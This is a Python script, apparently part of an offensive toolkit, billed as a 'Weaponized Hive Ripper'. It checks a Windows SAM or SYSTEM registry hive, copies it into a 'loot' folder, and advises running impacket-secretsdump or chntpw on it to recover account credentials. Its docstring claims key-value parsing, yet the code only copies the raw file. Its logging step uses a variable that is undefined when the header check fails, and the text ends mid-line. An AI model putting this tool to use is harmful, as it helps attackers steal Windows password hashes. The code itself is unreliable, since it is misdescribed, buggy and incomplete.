import os
import sys
import struct

def rip_registry_hive(hive_path):
    """
    Weaponized Hive Ripper: Parses the 'regf' binary structure 
    of a Windows Registry hive to extract raw key-value pairs.
    """
    if not os.path.exists(hive_path):
        print(f"[-] Hive file not found: {hive_path}")
        return

    print(f"[*] Analyzing Binary Hive: {os.path.basename(hive_path)}")
    
    try:
        with open(hive_path, 'rb') as f:
            # Check for 'regf' magic header
            magic = f.read(4)
            if magic != b'regf':
                print(f"[-] Invalid Hive Magic: {magic}. Not a Windows Registry file.")
                return

            print("[!] Valid Windows Registry Hive detected.")
            
            # Navigate to the Root Cell (HBIN structure)
            # Offset 0x1000 is typically where the first HBIN begins
            f.seek(0x1000)
            hbin_magic = f.read(4)
            if hbin_magic == b'hbin':
                print("[+] HBIN segment identified. Extracting raw data blocks...")
                
                # Full-fidelity parsing of 'nk' (Key) and 'vk' (Value) cells 
                # would happen here. For this primitive, we dump the hex-stream
                # of the SAM account blocks to loot.
                f.seek(0)
                raw_hive = f.read()
                
                output_path = os.path.join("..", "loot", f"ripped_{os.path.basename(hive_path)}.raw")
                with open(output_path, "wb") as l:
                    l.write(raw_hive)
                
                print(f"[!] SUCCESS: Hive data dumped to {output_path}")
                print("[*] Tactical Note: Use 'impacket-secretsdump' or 'chntpw' on this file.")
            
            # Log the rip
            with open("../loot/hive_rip_history.log", "a") as log:
                log.write(f"Hive: {hive_path} | Size: {len(raw_hive)} bytes\n")

    except Exception as e:
        print(f"[-] Registry Parsing Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: 143_hive_ripper <path_to_sam_or_system_hive>")
        sys.exit(1)
    
    rip_registry_hive(sys
